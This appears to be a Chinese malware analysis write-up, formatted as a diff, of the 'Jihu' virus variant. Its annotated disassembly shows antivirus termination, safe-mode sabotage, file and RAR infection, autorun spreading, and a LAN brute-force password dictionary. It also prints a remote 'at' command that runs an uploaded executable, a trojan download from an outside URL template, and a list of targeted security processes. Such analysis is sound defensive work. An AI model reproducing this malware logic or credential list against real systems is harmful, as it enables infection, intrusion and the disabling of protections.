-.text:00405EB4                 push    0               ; lpCurrentDirectory  
-.text:00405EB6                 push    0               ; lpEnvironment  
-.text:00405EB8                 push    0C000000h       ; dwCreationFlags  
-.text:00405EBD                 push    1               ; bInheritHandles  
-.text:00405EBF                 push    0               ; lpThreadAttributes  
-.text:00405EC1                 push    0               ; lpProcessAttributes  
-.text:00405EC3                 lea     eax, \[ebp+CommandLine\]  
-.text:00405EC9                 push    eax             ; lpCommandLine  
-.text:00405ECA                 push    0               ; lpApplicationName  
-.text:00405ECC                 call    ds:CreateProcessA ; 再将压缩程序并入"%s M -ibck -r -o+ -ep1 \\"%s\\" \\"%s\\\\\*\\""以命令行参数运行之，将感染后的文件打包压缩回去  
-  
-.text:00405F03                 push    0               ; hTemplateFile  
-.text:00405F05                 push    80h             ; dwFlagsAndAttributes  
-.text:00405F0A                 push    3               ; dwCreationDisposition  
-.text:00405F0C                 push    0               ; lpSecurityAttributes  
-.text:00405F0E                 push    3               ; dwShareMode  
-.text:00405F10                 push    0C0000000h      ; dwDesiredAccess  
-.text:00405F15                 lea     eax, \[ebp+FileName\]  
-.text:00405F1B                 push    eax             ; lpFileName  
-.text:00405F1C                 call    ds:CreateFileA  ; 创建文件句柄，准备将感染后的 rar 文件设置成原来的时间.text:00405F22                 mov     \[ebp+hFile\], eax  
-.text:00405F28                 push    1               ; int  
-.text:00405F2A                 lea     eax, \[ebp+CreationTime\]  
-.text:00405F30                 push    eax             ; lpCreationTime  
-.text:00405F31                 push    \[ebp+hFile\]     ; hFile  
-.text:00405F37                 call    FileOldTime     ; 将被感染后的 RAR 文件设置成原来的时间  
-  
-下面是感染磁盘的过程，过程为搜索磁盘并判断类型，如果是可移动磁盘则获得系统内的盘符，查找可移动存储，并把自身复制到这个盘下面的  
-recycle.{645FF040-5081-101B-9F08-00AA002F954E}\\setup.exe，并创建 autorun.inf 文件，过程如下：  
-.text:00408B08                 push    eax  
-.text:00408B09                 call    \[ebp+GetDriveTypeA\]  
-.text:00408B0C                 cmp     eax, 2  
-.text:00408B0F                 jnz     short GoOutGetNext ; 非可移动磁盘，跳走  
-.text:00408B11                 lea     eax, \[ebp+var\_18\]  
-.text:00408B14                 push    eax  
-.text:00408B15                 call    FautorunWR      ; 在磁盘上创建 autorunini  
-  
-.text:0040870E                 push    offset aSetup\_exe ; "Setup.exe"  
-.text:00408713                 lea     eax, \[ebp+PathName\]  
-.text:00408719                 push    eax  
-.text:0040871A                 push    offset aSS      ; "%s\\\\%s"  
-.text:0040871F                 lea     eax, \[ebp+FileName\]  
-.text:00408725                 push    eax             ; LPSTR  
-.text:00408726                 call    ds:wsprintfA    ; 构建 recycle.{645FF040-5081-101B-9F08-00AA002F954E}\\setup.exe 路径  
-.text:00408836                 push    1               ; dwFlags  
-.text:00408838                 lea     eax, \[ebp+NewFileName\]  
-.text:0040883E                 push    eax             ; lpNewFileName  
-.text:0040883F                 lea     eax, \[ebp+pszPath\]  
-.text:00408845                 push    eax             ; lpExistingFileName  
-.text:00408846                 call    ds:MoveFileExA  ; 将自身复制过去  
-  
-该病毒通过局域网传播，使用用户名 Administrator   Guest    Admin    Root  
-用户密码：  
-234.password.6969.harley.123456.golf.pussy.mustang. 1111.shadow.1313.fish.5150.7777.qwerty.baseball.2112.letmein.   
-12345678.12345.ccc.admin.5201314.qq520.1.12.123.1234567.   
-123456789.654321.54321.111.000000.abc.pw.11111111.   
-88888888.pass.passwd.database.abcd.abc123.pass.sybase.   
-123qwe.server.computer.520.super.123asd.0.ihavenopass.   
-godblessyou.enable.xp.2002.2003.2600.alpha.110.111111.   
-121212.123123.1234qwer.   
-123abc.007.a.aaa.patrick.pat.administrator.root.sex.god.   
-fuckyou.fuck.abc.test.test123.temp.temp123.win.pc.asdf.pwd.   
-qwer.yxcv.zxcv.home.xxx.owner.login.Login.pw123.love.mypc.   
-mypc123.admin123.mypass.mypass123.901100.  
-下面是攻击局域网用户  
-.text:004083F1                 mov     \[ebp+lpUserName\], offset UserName\_0 ; 取第一个用户名  
-.text:004083F8 UserNext:                            
-.text:004083F8                 mov     eax, \[ebp+lpUserName\]  
-.text:004083FB                 movsx   eax, byte ptr \[eax\]  
-.text:004083FE                 test    eax, eax  
-.text:00408400                 jz      loc\_408492  
-.text:00408406                 cmp     \[ebp+var\_4\], 0  
-.text:0040840A                 jnz     loc\_408492  
-.text:00408410                 mov     \[ebp+var\_54\], 1  
-.text:00408417                 mov     \[ebp+lpPassword\], offset UserPassword ; 取第一个密码  
-             PassWordNext:           
-.text:0040841E                 mov     eax, \[ebp+lpPassword\]  
-.text:00408421                 movsx   eax, byte ptr \[eax\]  
-.text:00408424                 test    eax, eax  
-.text:00408426                 jz      short GetNextUserName  
-.text:00408428                 cmp     \[ebp+var\_54\], 1  
-.text:0040842C                 jnz     short SendVirToNet  
-.text:0040842E                 mov     \[ebp+lpPassword\], offset UserName  
-.text:00408435 SendVirToNet:                           ; CODE XREF:   
-.text:00408435                 push    \[ebp+lpPassword\] ; lpPassword  
-.text:00408438                 push    \[ebp+lpUserName\] ; lpUserName  
-.text:0040843B                 lea     eax, \[ebp+String1\]  
-.text:0040843E                 push    eax             ; int  
-.text:0040843F                 call    SendVirNet      ; 上传病毒到局域网电脑上设置 3 分钟后运行  
-.text:00408444                 cmp     eax, 1  
-.text:00408447                 jnz     short loc\_408452  
-.text:00408449                 mov     \[ebp+var\_4\], 1  
-.text:00408450                 jmp     short GetNextUserName  
-.text:00408452 loc\_408452:                             ; CODE XREF:   
-.text:00408452                 cmp     \[ebp+var\_54\], 1  
-.text:00408456                 jnz     short loc\_408465  
-.text:00408458                 mov     \[ebp+lpPassword\], offset UserPassword  
-.text:0040845F                 and     \[ebp+var\_54\], 0  
-.text:00408463                 jmp     short GoNextPassWord ; 跳回接着比较  
-.text:00408465 loc\_408465:                             ; CODE XREF:   
-.text:00408465                 push    \[ebp+lpPassword\] ; lpString  
-.text:00408468                 call    ds:lstrlenA  
-.text:0040846E                 mov     ecx, \[ebp+lpPassword\]  
-.text:00408471                 lea     eax, \[ecx+eax+1\]  
-.text:00408475                 mov     \[ebp+lpPassword\], eax ; 取下一个密码  
-.text:00408478 GoNextPassWord:                         ; CODE XREF:   
-.text:00408478                 jmp     short PassWordNext ; 跳回接着比较  
-.text:0040847A GetNextUserName:                        ; CODE XREF:   
-.text:0040847A                 push    \[ebp+lpUserName\] ; lpString  
-.text:0040847D                 call    ds:lstrlenA  
-.text:00408483                 mov     ecx, \[ebp+lpUserName\]  
-.text:00408486                 lea     eax, \[ecx+eax+1\]  
-.text:0040848A                 mov     \[ebp+lpUserName\], eax ; 取下一个用户名  
-.text:0040848D                 jmp     UserNext  
-  
-上传的时首先构建 at 命了，设置上传成功后三分钟运行，上传位置到 C：\\CONFIG.EXE  
-.text:00408354                 push    offset aConfig  ; "CONFIG"  
-.text:00408359                 movzx   eax, \[ebp+SystemTime.wMinute\]  
-.text:00408360                 add     eax, 3  
-.text:00408363                 push    eax  
-.text:00408364                 movzx   eax, \[ebp+SystemTime.wHour\]  
-.text:0040836B                 push    eax  
-.text:0040836C                 push    \[ebp+arg\_0\]  
-.text:0040836F                 push    offset aAtSDDCS\_exe ; "at \\\\\\\\%s %d:%d C:\\\\%s.exe"  
-.text:00408374                 lea     eax, \[ebp+CmdLine\]  
-.text:0040837A                 push    eax             ; 设置 at 命令  
-.text:0040837B                 call    \[ebp+var\_24\]  
-.text:0040837E                 add     esp, 18h  
-.text:00408381                 push    0               ; uCmdShow  
-.text:00408383                 lea     eax, \[ebp+CmdLine\]  
-.text:00408389                 push    eax             ; lpCmdLine  
-.text:0040838A                 call    ds:WinExec      ; 运行 at 命令..  
-.text:00408397                 push    \[ebp+hObject\]   ; hObject  
-.text:0040839A                 call    ds:CloseHandle  
-.text:004083A0 loc\_4083A0:                             ; CODE XREF:   
-.text:004083A0                 push    1               ; fForce  
-.text:004083A2                 push    1               ; dwFlags  
-.text:004083A4                 lea     eax, \[ebp+Name\]  
-.text:004083A7                 push    eax             ; lpName  
-.text:004083A8                 call    WNetCancelConnection2A ;   
-  
-  
-  
-下面是下载木马的过程   
-.text:00402DAC GetNextIP:   
-.text:00402DAC                 xor     eax, eax  
-.text:00402DAE                 inc     eax  
-.text:00402DAF                 jz      FailReturn  
-.text:00402DB5                 push    40h             ; size\_t  
-.text:00402DB7                 push    0               ; int  
-.text:00402DB9                 lea     eax, \[ebp+String2\]  
-.text:00402DBF                 push    eax             ; void \*  
-.text:00402DC0                 call    memset  
-.text:00402DC5                 add     esp, 0Ch  
-.text:00402DC8                 push    0               ; int  
-.text:00402DCA                 push    40h             ; dwAddressStringLength  
-.text:00402DCC                 lea     eax, \[ebp+String2\]  
-.text:00402DD2                 push    eax             ; lpString2  
-.text:00402DD3                 push    \[ebp+arg\_8\]     ; int  
-.text:00402DD6                 push    \[ebp+var\_4\]     ; int  
-.text:00402DD9                 call    GetAddrInfo     ; 获取地址信息  
-.text:00402DDE                 test    eax, eax  
-.text:00402DE0                 jnz  short SucessGetAdd ; 获取地址信息成功跳走下载木马  
-.text:00402DE2                 and     \[ebp+var\_8\], 0  
-.text:00402DE6                 jmp     short FailReturn ; 获取地址信息失败跳走  
-.text:00402DE8 SucessGetAdd:    
-.text:00402DE8                 push    400h            ; size\_t  
-.text:00402DED                 push    0               ; int  
-.text:00402DEF                 lea     eax, \[ebp+var\_410\]  
-.text:00402DF5                 push    eax             ; void \*  
-.text:00402DF6                 call    memset  
-.text:00402DFB                 add     esp, 0Ch  
-.text:00402DFE                 push    \[ebp+arg\_4\]  
-.text:00402E01                 push    dword\_40BE64    ; 1F90h  
-.text:00402E07                 lea     eax, \[ebp+String2\]  
-.text:00402E0D                 push    eax  
-.text:00402E0E                 push    offset aHttpSDS ; "http://%s:%d/%s"  
-.text:00402E13                 lea     eax, \[ebp+var\_410\]  
-.text:00402E19                 push    eax             ; LPSTR  
-.text:00402E1A                 call    ds:wsprintfA    ; 构造木马路径  
-.text:00402E20                 add     esp, 14h  
-.text:00402E23                 push    \[ebp+lpFileName\] ; lpFileName  
-.text:00402E26                 call    ds:DeleteFileA  
-.text:00402E2C                 push    \[ebp+lpFileName\] ; lpFileName  
-.text:00402E2F                 lea     eax, \[ebp+var\_410\]  
-.text:00402E35                 push    eax             ; int  
-.text:00402E36                 call    ReadInternetFile ; 从网上读取数据  
-.text:00402E3B                 cmp     eax, 1  
-.text:00402E3E                 jnz   short SucessRead ; 读取成功通过这里跳回接着读取  
-.text:00402E40                 mov     \[ebp+var\_8\], 1  
-.text:00402E47                 jmp     short FailReturn  
-.text:00402E49 SucessRead:                          
-.text:00402E49                 jmp     GetNextIP  
-  
 附件中的病毒为隐藏文件，注意在虚拟机中调试
 
-上传的附件
-| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || 极虎病毒.rar \[解压密码：killvirus\]   
- |
+分析的比较仓促，有一部分行为也没有仔细分析，请大家多多指教哈^\_^
+
+## 一、概述
+
+本文档讲述关于极虎病毒变种的行为、技术细节；
+
+该病毒主要通过互联网和局域网传播，其大小为 248,832 字节 ，编写语言不详。运行后先判断自身模块位置，如为 `0x0040000` 则认为是 `exe` 文件，此时打开指定服务，搜索指定的 `dll` 文件，找到合适之后将自身修改成 `dll` 路径替换之。如果不为 `0x0040000` 则认定自身为 `dll` 文件然后破坏安全模式，结束杀毒软件，下载木马，感染指定类型的文件，感染可移动磁盘，攻击局域网用户。
+
+## 二、行为预览
+
+1.  病毒名称：极虎病毒(又名虎虎生威)
+2.  病毒类型：感染型病毒
+3.  病毒大小：248,832 字节
+4.  传播方式：互联网，局域网，可移动存储介质，网页挂马
+5.  相关文件：
+    *   【极虎病毒】分析报告.doc : 病毒分析报告
+    *   极虎病毒 exe.v : 病毒样本；
+    *   极虎病毒.idb : 病毒 IDA 打开文件；
+6.  病毒具体行为：
+    *   获取自身模块地址和 `0x0040000` 作比较，不同则判断成 `exe` 文件运行。此时将自身读入内存并修改成 `dll` 属性，然后查找指定的服务，找到其中停止的服务，并查找对应的 `dll` 用自身替换之。
+    *   当为 `dll` 被加载时首先搜寻 `avp.exe`, `bdagent.exe` 进程，如果找到则写入一堆 `nop` 跳过之后将其删除。在临时文件夹下释放驱动文件加载后删除。获取自身模块对应的服务将其设置成开机启动。
+    *   利用驱动干扰和结束杀毒软件，分别向驱动发送 `IRP` 吗添加劫持和结束杀软。其中被结束的杀软名有：`KVMonXP.kxp`, `KVSrvXP.exe`, `avp.exe`, `avp.exe`, `avp.exe`, `RavMonD.exe`, `RavTask.exe`, `RsAgent.exe`, `rsnetsvr.exe`, `RsTray.exe`, `ScanFrm.exe`, `CCenter.exe`, `kavstart.exe`, `kissvc.exe`, `kpfw32.exe`, `kpfwsvc.exe`, `kswebshield.exe`, `kwatch.exe`, `kmailmon.exe`, `egui.exe`, `ekrn.exe`, `ccSvcHst.exe`, `ccSvcHst.exe`, `ccSvcHst.exe`, `Mcagent.exe`, `mcmscsvc.exe`, `McNASvc.exe`, `Mcods.exe`, `McProxy.exe`, `Mcshield.exe`, `mcsysmon.exe`, `mcvsshld.exe`, `MpfSrv.exe`, `McSACore.exe`, `msksrver.exe`, `sched.exe`, `avguard.exe`, `avmailc.exe`, `avwebgrd.exe`, `avgnt.exe`, `sched.exe`, `avguard.exe`, `avcenter.exe`, `UfSeAgnt.exe`, `TMBMSRV.exe`, `SfCtlCom.exe`, `TmProxy.exe`, `360SoftMgrSvc.exe`, `360tray.exe`, `qutmserv.exe`, `bdagent.exe`, `livesrv.exe`, `seccenter.exe`, `vsserv.exe`, `MPSVC.exe`, `MPSVC1.exe`, `MPSVC2.exe`, `MPMon.exe`, `ast.exe`, `360speedld.exe`, `360SoftMgrSvc.exe`, `360tray.exe`, `修复工具.exe`, `360hotfix.exe`, `360rpt.exe`, `360safe.exe`, `360safebox.exe`, `krnl360svc.exe`, `zhudongfangyu.exe`, `360sd.exe`, `360rp.exe`, `360se.exe`, `safeboxTray.exe`。
+    *   删除指定注册表 `SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal` 和 `SYSTEM\CurrentControlSet\Control\SafeBoot\Network` 来破坏安全模式。修改 `host` 文件。感染文件，其中感染文件类型如下：`exe`，`asp`，`aspx`，`asp`，`htm`，`html`，`rar`。对 `exe` 文件主要是在添加一个 `.tc` 节头，然后在末尾写上一串 shell 代码，对 `rar` 文件则首先解压到临时文件夹内，然后感染之再打包压回。其他文件则在末尾写上一串脚本。感染之前跳过系统路径包括 `WinRAR`，`WindowsUpdate`，`Windows NT`，`Windows Media Player`，`Outlook Express`，`NetMeeting`，`MSN Gaming Zone`，`Movie Maker`
+    *   `microsoft frontpage`，`Messenger`，`Internet Explorer`，`InstallShield Installation Information`，`ComPlus Applications`，`Common Files`，`RECYCLER`，`System Volume Information`，`Documents and Settings`，`WinNT`，`WINDOWS`。
+
+## 三、清理方式
+
+由于该病毒破坏安全模式并感染电脑上大部分文件，手动很难清除，故建议采用专杀工具清理。
+
+【以下为正文】
+
+## 四、正文
+
+```
+.text:00401B7E                 call    $+5
+
+.text:00401B83                 mov  eax, [esp+2Ch+var_2C] ;  取当前地址
+
+.text:00401B86                 mov     [ebp+lpAddress], eax
+
+.text:00401B89                 pop     eax
+
+.text:00401B8A                 push    1Ch             ; size_t
+
+.text:00401B8C                 push    0               ; int
+
+.text:00401B8E                 lea     eax, [ebp+Buffer]
+
+.text:00401B91                 push    eax             ; void *
+
+.text:00401B92                 call    memset
+
+.text:00401B97                 add     esp, 0Ch
+
+.text:00401B9A                 push    1Ch             ; dwLength
+
+.text:00401B9C                 lea     eax, [ebp+Buffer]
+
+.text:00401B9F                 push    eax             ; lpBuffer
+
+.text:00401BA0                 push    [ebp+lpAddress] ; lpAddress
+
+.text:00401BA3                 call    ds:VirtualQuery
+
+.text:00401BA9                 mov     eax, [ebp+Buffer.AllocationBase]
+
+.text:00401BAC                 mov     hModule, eax
+
+.text:00401BB1                 push    0               ; lpModuleName
+
+.text:00401BB3                 call    ds:GetModuleHandleA
+
+.text:00401BB9                 cmp     eax, hModule    ; 检查当前地址
+
+.text:00401BBF                 jnz     short DllFile   ; 当是 Dll 文件时跳走
+
+.text:00401BC1                 push    [ebp+arg_C]
+
+.text:00401BC4                 push    [ebp+arg_8]
+
+.text:00401BC7                 push    [ebp+arg_4]
+
+.text:00401BCA                 push    [ebp+arg_0]
+
+text:00401BCD              call   ExeRun .; 当该文件为 exe 执行
+
+.text:00401BD2                 mov     [ebp+var_24], eax
+
+.text:00401BD5                 jmp     short loc_401BE8
+
+.text:00401BD7 DllFile:                         
+
+.text:00401BD7                 push    [ebp+arg_8]
+
+.text:00401BDA                 push    [ebp+arg_4]
+
+.text:00401BDD                 push    [ebp+arg_0]
+
+.text:00401BE0                 call    DllRun      . ; 当是 Dll 时执行
+```
+
+当该文件为 `exe` 文件时首先创建管道`\\\\.\\pipe\\96DBA249-E88E-4c47-98DC-E18E6E`，如果成功就尝试从管道中读取数据，如果失败则通过判断错误码，如果是所有管道都在使用中则终止程序。实现过程如下：
+
+```
+.text:0040657E                 push    0               ; hTemplateFile
+
+.text:00406580                 push    0    ; dwFlagsAndAttributes
+
+.text:00406582                 push    3     ; dwCreationDisposition
+
+.text:00406584                 push    0     ; lpSecurityAttributes
+
+.text:00406586                 push    0               ; dwShareMode
+
+.text:00406588                 push    0C0000000h      ; dwDesiredAccess
+
+.text:0040658D                 push    [ebp+lpFileName] ; lpFileName
+
+.text:00406590                 call    ds:CreateFileA  ; 尝试打开管道"\\.\\pipe\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A"
+
+.text:00406596                 mov     [ebp+hObject], eax
+
+.text:00406599                 cmp     [ebp+hObject], 0FFFFFFFFh
+
+.text:0040659D                 jnz     short loc_4065C7 ; 打开成功跳走
+
+.text:0040659F                 push    1               ; Buffer
+
+.text:004065A1                 lea     eax, [ebp+String2]
+
+.text:004065A7                 push    eax             ; lpBuffer
+
+.text:004065A8                 call    CreateBin       ; 打开成功，创建"C:\\DelInfo.bin"文件
+
+.text:004065AD                 call    ds:GetLastError
+
+.text:004065B3                 cmp     eax, 0E7h       ; 错误吗意义：所有的管道范例都在使用中。
+
+.text:004065B8                 jnz     short Over_0    ; 没有空闲的管道，跳出
+
+.text:004065BA                 push    0               ; uExitCode
+
+.text:004065BC                 call   ds:ExitProcess  ; 管道在使用终止程序
+```
+
+当打开管道成功后跳到这里
+
+```
+\=============================================================
+
+.text:004065C7                 mov     [ebp+Mode], 2   ; 管道模式
+
+.text:004065CE                 push    0       ; lpCollectDataTimeout
+
+.text:004065D0                 push    0        ; lpMaxCollectionCount
+
+.text:004065D2                 lea     eax, [ebp+Mode] ; PIPE_READMODE_MESSAGE
+
+.text:004065D5                 push    eax             ; lpMode
+
+.text:004065D6                 push    [ebp+hObject]   ; hNamedPipe
+
+.text:004065D9                 call    ds:SetNamedPipeHandleState ; 设置成读和阻塞模式
+
+.text:004065DF                 push    0               ; lpOverlapped
+
+.text:004065E1                 lea     eax, [ebp+NumberOfBytesRead]
+
+.text:004065E4                 push    eax      ; lpNumberOfBytesWritten
+
+.text:004065E5                 push    2        ; nNumberOfBytesToWrite
+
+.text:004065E7                 push    offset byte_40BE6C ; lpBuffer
+
+.text:004065EC                 push    [ebp+hObject]   ; hFile
+
+.text:004065EF                 call    ds:WriteFile    ; 将 DD 写入管道中
+
+.text:004065F5                 push    0               ; lpOverlapped
+
+.text:004065F7                 lea     eax, [ebp+NumberOfBytesRead]
+
+.text:004065FA                 push    eax             ; lpNumberOfBytesRead
+
+.text:004065FB                 push    104h            ; nNumberOfBytesToRead
+
+.text:00406600                 push    offset String   ; lpBuffer
+
+.text:00406605                 push    [ebp+hObject]   ; hFile
+
+.text:00406608                 call    ds:ReadFile     ; 从管道中读取数据
+
+.text:0040660E                 push    offset String   ; lpString
+
+.text:00406613                 call    ds:lstrlenA
+
+.text:00406619                 test    eax, eax
+```
+
+
+
+`.text:0040661B` `jnz short ReadSucceed ; 从该管道读取数据成功`
+
+```
+.text:0040661D                 push    [ebp+hObject]   ; hObject
+.text:00406620                 call    ds:CloseHandle
+.text:00406626                 push    1               ; Buffer
+.text:00406628                 lea     eax, [ebp+String2]
+.text:0040662E                 push    eax             ; lpBuffer
+.text:0040662F                 call    CreateBin
+.text:00406634                 push    0               ; uExitCode
+.text:00406636                 call    ds:ExitProcess  ; 管道读取数据失败终止程序
+```
+
+在管道中读取数据成功后则通过 `strrchr` 函数搜索以 `2E` 开头的 ASCII 吗字符串，之后反复打开上面管道，知道找不到文件为止，实现方法如下：
+
+```
+.text:0040666C Next:                   ; CODE XREF:
+.text:0040666C                 mov     eax, [ebp+var_26C]
+.text:00406672                 inc     eax
+.text:00406673                 mov     [ebp+var_26C], eax
+.text:00406679 loc_406679:
+.text:00406679                 cmp     [ebp+var_26C], 64h
+.text:00406680                 jge     short Over_1
+.text:00406682                 push    0          ; hTemplateFile
+.text:00406684                 push    0         ; dwFlagsAndAttributes
+.text:00406686                 push    3         ; dwCreationDisposition
+.text:00406688                 push    0         ; lpSecurityAttributes
+.text:0040668A                 push    0            ; dwShareMode
+.text:0040668C                 push    0C0000000h    ; dwDesiredAccess
+.text:00406691                 push    [ebp+lpFileName] ; lpFileName
+.text:00406694                 call    ds:CreateFileA  ; 尝试打开"\\.pipe\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A"
+.text:0040669A                 mov     [ebp+hObject], eax
+.text:0040669D                 cmp     [ebp+hObject], 0FFFFFFFFh
+.text:004066A1                 jnz     short OpenPipeFail
+.text:004066A3                 call    ds:GetLastError
+.text:004066A9                 cmp     eax, 2         ; 错误码：系统找不到指定文件
+.text:004066AC                 jnz     short Next_1
+.text:004066AE                 jmp     short Over_1    ; 反复打开管道，知道找不到文件后推出
+.text:004066B0 Next_1:
+.text:004066B0                 jmp     short GetNext
+.text:004066B2 OpenPipeFail:
+.text:004066B2                 push    [ebp+hObject]   ; hObject
+.text:004066B5                 call    ds:CloseHandle
+.text:004066BB GetNext:
+.text:004066BB                 push    32h             ; dwMilliseconds
+.text:004066BD                 call    ds:Sleep        ; 睡眠 32h 毫秒
+.text:004066C3                 jmp     short Next
+```
+
+然后获取自身文件名完整路径，申请一块堆内存将自身读入内存并修改成 dll 属性，实现方法如下：
+
+```
+.text:00401C0B                 push    104h            ; nSize
+.text:00401C10                 lea     eax, [ebp+FileName]
+.text:00401C16                 push    eax             ; lpFilename
+.text:00401C17                 push    [ebp+hModule]   ; hModule
+.text:00401C1A                 call    ds:GetModuleFileNameA
+.text:00401C20                 and     [ebp+var_120], 0
+.text:00401C27                 jmp     short loc_401C36
+.text:00401C29 loc_401C29:
+.text:00401C29                 mov     eax, [ebp+var_120]
+.text:00401C2F                 inc     eax
+.text:00401C30                 mov     [ebp+var_120], eax
+.text:00401C36 loc_401C36:
+.text:00401C36                 cmp     [ebp+var_120], 32h
+.text:00401C3D                 jge     short loc_401C70
+.text:00401C3F                 push    0               ; hTemplateFile
+.text:00401C41                 push    0       ; dwFlagsAndAttributes
+.text:00401C43                 push    3     ; dwCreationDisposition
+.text:00401C45                 push    0         ; lpSecurityAttributes
+.text:00401C47                 push    1               ; dwShareMode
+.text:00401C49                 push    80000000h       ; dwDesiredAccess
+.text:00401C4E                 lea     eax, [ebp+FileName] ; 自身文件路径
+.text:00401C54                 push    eax             ; lpFileName
+.text:00401C55                 call    ds:CreateFileA  ; 创建打开自身的文件句柄
+.text:00401C5B                 mov     [ebp+hObject], eax
+.text:00401C5E                 cmp     [ebp+hObject], 0FFFFFFFFh
+.text:00401C62                 jz      short loc_401C66 ; 打开失败跳走
+.text:00401C64                 jmp     short loc_401C70
+.text:00401C66 loc_401C66:
+.text:00401C66                 push    64h             ; dwMilliseconds
+.text:00401C68                 call    ds:Sleep
+.text:00401C6E                 jmp     short loc_401C29 ; 跳回接着读取自身
+.text:00401C70 loc_401C70:
+.text:00401C70                 push    0               ; lpFileSizeHigh
+.text:00401C72                 push    [ebp+hObject]   ; hFile
+.text:00401C75                 call    ds:GetFileSize ; 打开成功跳到这里获得文件长度
+.text:00401C7B                 mov     [ebp+nNumberOfBytesToRead], eax
+.text:00401C7E                 cmp     [ebp+nNumberOfBytesToRead], 0
+.text:00401C82                 jz    short loc_401C8A ; 文件长度为 0 跳走关闭句柄退出
+.text:00401C84                 cmp     [ebp+nNumberOfBytesToRead], 0FFFFFFFFh
+.text:00401C88                 jnz  short loc_401CA6 ; 文件长度合适，跳走准备内存读取
+.text:00401C8A loc_401C8A:
+.text:00401C8A                 push    [ebp+hObject]   ; hObject
+.text:00401C8D                 call    ds:CloseHandle
+.text:00401C93                 mov     eax, [ebp+arg_4]
+.text:00401C96                 and     dword ptr [eax], 0
+.text:00401C99                 mov     eax, [ebp+arg_8]
+.text:00401C9C                 and     dword ptr [eax], 0
+.text:00401C9F                 xor     eax, eax
+.text:00401CA1                 jmp     locret_401D57
+.text:00401CA6 loc_401CA6:
+.text:00401CA6                 mov     eax, [ebp+arg_8]
+.text:00401CA9                 mov     ecx, [ebp+nNumberOfBytesToRead]
+.text:00401CAC                 mov     [eax], ecx
+.text:00401CAE                 mov     eax, [ebp+nNumberOfBytesToRead]
+.text:00401CB1                 add     eax, 20h
+.text:00401CB4                 push    eax             ; unsigned int
+.text:00401CB5                 call    ??2@YAPAXI@Z    ; operator new(uint)
+.text:00401CBA                 pop     ecx
+.text:00401CBB                 mov     [ebp+var_124], eax
+.text:00401CC1                 mov     eax, [ebp+var_124]
+.text:00401CC7                 mov     [ebp+lpBuffer], eax
+.text:00401CCD                 mov     eax, [ebp+arg_4]
+.text:00401CD0                 mov     ecx, [ebp+lpBuffer]
+.text:00401CD6                 mov     [eax], ecx
+.text:00401CD8                 mov     eax, [ebp+nNumberOfBytesToRead]
+.text:00401CDB                 add     eax, 20h
+.text:00401CDE                 push    eax             ; size_t
+.text:00401CDF                 push    0               ; int
+.text:00401CE1                 push    [ebp+lpBuffer]  ; void *
+.text:00401CE7                 call    memset          ; 将申请的内存区域清 0
+.text:00401CEC                 add     esp, 0Ch
+.text:00401CEF                 push    0               ; lpOverlapped
+.text:00401CF1                 lea     eax, [ebp+NumberOfBytesRead]
+.text:00401CF4                 push    eax             ; lpNumberOfBytesRead
+.text:00401CF5                 push    [ebp+nNumberOfBytesToRead] ; nNumberOfBytesToRead
+.text:00401CF8                 push    [ebp+lpBuffer]  ; lpBuffer
+.text:00401CFE                 push    [ebp+hObject]   ; hFile
+.text:00401D01                 call    ds:ReadFile     ; 读取自身到指定的内存中
+.text:00401D07                 push    [ebp+hObject]   ; hObject
+.text:00401D0A                 call    ds:CloseHandle
+```
+
+
+
+```
+.text:00401D10                 and     [ebp+var_10], 0  
+
+.text:00401D14                 mov     eax, [ebp+lpBuffer]  
+
+.text:00401D1A                 mov     ecx, [ebp+lpBuffer]  
+
+.text:00401D20                 add     ecx, [eax+3Ch]  ; 取该文件 DOS 头的最后一个成员变量，使 ecx 定位到 NT 头  
+
+.text:00401D23                 mov     [ebp+var_10], ecx  
+
+.text:00401D26                 cmp     [ebp+hModule], 0  
+
+.text:00401D2A                 jz      short loc_401D41 ; 这里是 0 代表读取自身  
+
+.text:00401D2C                 mov     eax, [ebp+var_10]  
+
+.text:00401D2F                 movzx   eax, word ptr [eax+16h]  
+
+.text:00401D33                 and     eax, 0DFFFh     .; 修改自身成 dll 属性  
+```
+
+获取临时文件夹路径和系统 windows 路径，在`"sfc_os.dll"`中搜索序号为 5 的函数，如果该 dll 装载失败则跳走从注册表中读取数据，打开设备管理器循环查看服务，当服务属于停止状态则替换该服务对应的 Dll，替换的文件是 Dll 属性的自身文件，之后跳走退出，不成功则跳回查询下一个。
+
+```
+.text:004020AE                 push    104h            ; uSize  
+
+.text:004020B3                 lea     eax, [ebp+Buffer]  
+
+.text:004020B9                 push    eax             ; lpBuffer  
+
+.text:004020BA                 call    ds:GetWindowsDirectoryA ; 获取 windows 系统目录  
+
+.text:004020C0                 push    104h            ; size_t  
+
+.text:004020C5                 push    0               ; int  
+
+.text:004020C7                 lea     eax, [ebp+TempPath]  
+
+.text:004020CD                 push    eax             ; void *  
+
+.text:004020CE                 call    memset  
+
+.text:004020D3                 add     esp, 0Ch  
+
+.text:004020D6                 lea     eax, [ebp+TempPath]  
+
+.text:004020DC                 push    eax             ; lpBuffer  
+
+.text:004020DD                 push    104h            ; nBufferLength  
+
+.text:004020E2                 call    ds:GetTempPathA ; 获取临时文件夹路径  
+
+.text:004020E8                 push    0F003Fh         ; dwDesiredAccess  
+
+.text:004020ED                 push    0               ; lpDatabaseName  
+
+.text:004020EF                 push    0               ; lpMachineName  
+
+.text:004020F1                 call    ds:OpenSCManagerA ; 打开设备管理器  
+
+.text:004020F7                 mov     [ebp+hSCManager], eax  
+
+.text:004020FA                 push    offset LibFileName ; "sfc_os.dll"  
+
+.text:004020FF                 call    ds:LoadLibraryA  
+
+.text:00402105                 mov     [ebp+hLibModule], eax  
+
+.text:0040210B                 cmp     [ebp+hLibModule], 0  
+
+.text:00402112                 jnz     short GetFunAddNo5 ; Dll 装载成功跳走  
+
+.text:00402114                 jmp     GetVauleReg  
+
+.text:00402119                 jmp     GetVauleReg  
+
+.text:0040211E GetFunAddNo5:           
+
+.text:0040211E                 push    5               ; lpProcName  
+
+.text:00402120                 push    [ebp+hLibModule] ; hModule  
+
+.text:00402126                 call    ds:GetProcAddress ; 取得序号为 5 的函数地址  
+
+.text:0040212C                 mov     FunNO5sfc_os, eax  
+
+text:00402141 NextService:            
+
+.text:00402141                 mov     eax, [ebp+var_B8C]  
+
+.text:00402147                 inc     eax  
+
+.text:00402148                 mov     [ebp+var_B8C], eax  
+
+.text:0040214E loc_40214E:                            
+
